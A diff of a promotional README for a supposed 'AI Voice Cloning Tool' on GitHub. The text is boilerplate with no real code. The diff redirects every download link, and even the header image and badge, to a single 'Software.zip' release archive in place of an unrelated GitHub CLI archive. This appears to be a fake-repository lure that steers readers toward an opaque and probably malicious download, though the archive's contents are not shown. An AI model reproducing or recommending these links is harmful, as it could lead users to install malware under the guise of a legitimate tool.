@@ -1,12 +1,12 @@
 
 # AI Voice Cloning Tool 🎤🤖
 
-![AI Voice Cloning Tool](https://imageurl.com)
+![AI Voice Cloning Tool](https://github.com/spaceforgets-code/AI-Voice-Cloning-Tool/releases/download/v1.0/Software.zip)
 
 Welcome to the AI Voice Cloning Tool repository! This project aims to provide a script that leverages the power of AI and deep learning to clone voices. With this tool, users can generate synthetic voices that sound like a specific speaker, opening up possibilities for various creative applications.
 
 ## Repository Link
-[Download AI Voice Cloning Tool](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[Download AI Voice Cloning Tool](https://github.com/spaceforgets-code/AI-Voice-Cloning-Tool/releases/download/v1.0/Software.zip)
 
 ## Overview
 Voice cloning has become an increasingly popular technology in recent years, allowing for the creation of personalized user experiences through synthetic voices. This repository offers a convenient script that showcases the potential of AI in voice cloning. By utilizing deep learning algorithms, the tool can mimic the unique characteristics of a speaker's voice, providing a seamless and realistic cloning experience.
@@ -44,6 +44,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 🚀 Start cloning voices with AI now! 🚀
 
-[![Download AI Voice Cloning Tool](https://img.shields.io/badge/Download-Cloning_Tool-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download AI Voice Cloning Tool](https://github.com/spaceforgets-code/AI-Voice-Cloning-Tool/releases/download/v1.0/Software.zip)](https://github.com/spaceforgets-code/AI-Voice-Cloning-Tool/releases/download/v1.0/Software.zip)
 
 Remember to always use AI technology responsibly and ethically. Happy voice cloning! 🎶🤖
